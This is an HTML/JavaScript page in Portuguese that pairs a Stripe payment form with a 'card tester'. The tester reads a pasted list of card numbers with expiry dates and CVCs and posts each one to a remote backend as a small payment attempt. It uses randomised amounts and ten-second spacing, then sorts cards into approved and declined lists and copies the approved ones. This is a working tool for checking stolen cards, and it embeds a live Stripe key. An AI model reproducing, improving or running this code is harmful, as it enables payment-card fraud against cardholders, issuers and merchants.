<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento Seguro</title>
  <script src="https://js.stripe.com/v3/"></script> <!-- Inclui Stripe.js -->
  <style>
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      font-family: Arial, sans-serif;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
    }
    h1 { text-align: center; font-size: 20px; }
    #card-element {
      border: 1px solid #ccc;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    button {
      display: block; width: 100%; padding: 10px;
      font-size: 16px; border: none; border-radius: 5px; cursor: pointer;
    }
    #pagarBtn { background-color: #007bff; color: white; }
    #pagarBtn:hover { background-color: #0056b3; }
    .erro { color: red; } .sucesso { color: green; }
    .tab { display: inline-block; padding: 10px; cursor: pointer; }
    .tab.active { font-weight: bold; text-decoration: underline; }
    .tab-content { display: none; padding: 10px; }
    .show { display: block; }
    .approved { background-color: lightgreen; padding: 5px; }
    .declined { background-color: lightcoral; padding: 5px; }
    .error { background-color: orange; padding: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Pagar com Cartão</h1>
    <form id="payment-form">
      <div id="card-element"></div>
      <button id="pagarBtn" disabled>Pagar R$ 10,00</button>
      <div id="card-errors" class="erro" role="alert"></div>
    </form>
  </div>

  <div class="container">
    <h2>Testador de Cartões</h2>
    <textarea id="cardInput" placeholder="Insira os cartões no formato: 5544630525881112|11|2030|027 (um por linha)"></textarea>
    <div>
      <button id="startBtn" style="background-color:green;color:white;">Iniciar</button>
      <button id="pauseBtn" style="background-color:blue;color:white;">Pausar</button>
      <button id="stopBtn" style="background-color:red;color:white;">Parar</button>
    </div>
    <div>
      <span class="tab active" onclick="showTab('approvedTab')">Aprovados</span> | 
      <span class="tab" onclick="showTab('declinedTab')">Reprovados</span> | 
      <span class="tab" onclick="showTab('errorTab')">Erros</span>
    </div>
    <div id="approvedTab" class="tab-content show">
      <h3>Aprovados</h3>
      <button onclick="copyApproved()">Copiar Aprovados</button>
      <div id="approvedList"></div>
    </div>
    <div id="declinedTab" class="tab-content">
      <h3>Reprovados</h3>
      <div id="declinedList"></div>
    </div>
    <div id="errorTab" class="tab-content">
      <h3>Erros</h3>
      <div id="errorList"></div>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", async function() {
      const stripe = Stripe("pk_live_51R1BLCFMTCrh72HkN23f1mf1kcFo1aQIydknl26DXCOsg888WkhcoDcxyKfElSucgvhMxkEdfDFqUdFCbsPi8Csn00CBeL4Vb7");
      const elements = stripe.elements();
      const card = elements.create("card", { hidePostalCode: true });
      card.mount("#card-element");

      card.on("change", function(event) {
        document.getElementById("pagarBtn").disabled = event.empty;
        document.getElementById("card-errors").textContent = event.error ? event.error.message : "";
      });

      document.getElementById("payment-form").addEventListener("submit", async function(event) {
        event.preventDefault();
        const { paymentMethod, error } = await stripe.createPaymentMethod({ type: "card", card: card });

        if (error) {
          document.getElementById("card-errors").textContent = error.message;
        } else {
          const response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ paymentMethod: paymentMethod.id, amount: 1000 }),
          });

          const data = await response.json();
          if (data.success) {
            const confirmResult = await stripe.confirmCardPayment(data.clientSecret, { payment_method: paymentMethod.id });
            if (confirmResult.error) {
              document.getElementById("card-errors").textContent = confirmResult.error.message;
            } else if (confirmResult.paymentIntent.status === 'succeeded') {
              alert('Pagamento realizado com sucesso!');
            }
          } else {
            document.getElementById("card-errors").textContent = data.message;
          }
        }
      });
    });

    let isTesting = false, isPaused = false, cardQueue = [], interval = null;

    function startTesting() {
      if (isTesting) return;
      isTesting = true; isPaused = false;
      cardQueue = document.getElementById("cardInput").value.split("\n").filter(line => line.trim() !== "");
      processQueue();
    }

    function pauseTesting() { isPaused = !isPaused; }
    function stopTesting() { isTesting = false; clearInterval(interval); }

    function processQueue() {
      if (!isTesting || cardQueue.length === 0) return;
      
      interval = setInterval(async () => {
        if (isPaused) return;
        if (cardQueue.length === 0) { stopTesting(); return; }

        let card = cardQueue.shift();
        let [number, expMonth, expYear, cvc] = card.split("|");

        let response = await fetch("https://chkfull.onrender.com/criar-payment-intent", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            paymentMethod: { type: "card", card: { number, exp_month: expMonth, exp_year: expYear, cvc } },
            amount: Math.floor(Math.random() * (1000 - 500 + 1)) + 500 
          }),
        });

        let result = await response.json();
        handleResult(card, result, response.status);
      }, 10000);
    }

    function handleResult(card, result, status) {
      let message = `${card} - Código: ${status}`;
      if (result.success) {
        document.getElementById("approvedList").innerHTML += `<p class="approved">${message}</p>`;
      } else if (status === 402) {
        document.getElementById("declinedList").innerHTML += `<p class="declined">${message}</p>`;
      } else {
        document.getElementById("errorList").innerHTML += `<p class="error">${message}</p>`;
      }
    }

    function showTab(tabId) {
      document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("show"));
      document.getElementById(tabId).classList.add("show");
    }

    function copyApproved() {
      let approvedText = Array.from(document.querySelectorAll("#approvedList p")).map(p => p.innerText.split(" - ")[0]).join("\n");
      navigator.clipboard.writeText(approvedText);
      alert("Cartões aprovados copiados!");
    }

    document.getElementById("startBtn").onclick = startTesting;
    document.getElementById("pauseBtn").onclick = pauseTesting;
    document.getElementById("stopBtn").onclick = stopTesting;
  </script>
</body>
</html>
